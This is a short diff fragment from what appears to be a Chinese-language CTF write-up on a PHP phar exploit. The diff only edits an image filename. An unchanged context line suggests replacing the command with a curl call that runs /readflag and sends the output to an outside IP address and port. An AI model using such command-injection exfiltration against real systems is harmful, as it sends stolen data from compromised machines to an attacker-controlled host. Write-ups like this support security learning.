@@ -162,7 +162,7 @@ $phar->stopBuffering();
 
 或者是cmd改成``curl "http://121.5.66.238:20010/?a=`/readflag`"``直接获取flag
 
-![](<../../.gitbook/assets/image (24) (1) (1) (1) (1) (1).png>)
+![](<../../.gitbook/assets/image (24) (1) (1) (1) (1) (1) (1).png>)
 
 ## 小结
 
